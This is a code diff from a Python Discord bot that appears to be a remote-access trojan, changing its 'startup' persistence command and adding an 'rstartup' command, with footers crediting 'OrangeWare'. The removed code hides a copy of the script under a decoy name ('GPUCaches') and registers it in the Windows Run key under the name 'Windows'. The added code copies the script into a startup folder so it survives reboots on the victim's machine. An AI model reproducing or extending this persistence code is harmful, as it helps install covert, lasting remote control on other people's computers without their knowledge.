@@ -765,27 +765,24 @@ async def screenoff(ctx):
 
 @bot.command()
 async def startup(ctx):
-    try:
-        exe = 'GPUCaches'
-        key = r'Software\Microsoft\Windows\CurrentVersion\Run'
-        directory = os.path.join(os.path.expanduser('~'), 'Documents', 'Resources')
-        path = os.path.join(directory, exe)
+    if os.path.exists(startup_path):
+        embed = discord.Embed(title="Already in Startup", description="The script is already set to run on startup.", color=0xFFFF00)
+    else:
+        shutil.copy(__file__, startup_path)
+        embed = discord.Embed(title="Startup Enabled", description="The script will now run on startup.", color=0x3498DB)
+    embed.set_footer(text="Creds to OrangeWare for making this command.")
+    await ctx.send(embed=embed)
 
-        
-        os.makedirs(directory, exist_ok=True)
-
-        
-        script_path = sys.argv[0]  
-        shutil.copy(script_path, path)
-
-        
-        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as reg_key:
-            winreg.SetValueEx(reg_key, 'Windows', 0, winreg.REG_SZ, path)
-
-        await ctx.send("Added to startup")
-
-    except Exception as e:
-        await ctx.send(f"Failed to add it. ( idk what happened tbh )")
+@bot.command()
+async def rstartup(ctx):
+    found = False
+    for file in os.listdir(startup_folder):
+        if file == script_name:
+            os.remove(os.path.join(startup_folder, file))
+            found = True
+    embed = discord.Embed(title="Startup Removed", description="The script was removed from startup." if found else "The script is not in the startup folder.", color=0x3498DB if found else 0xFF0000)
+    embed.set_footer(text="Command by OrangeWare")
+    await ctx.send(embed=embed)
 
 @bot.command()
 async def shutdown(ctx):
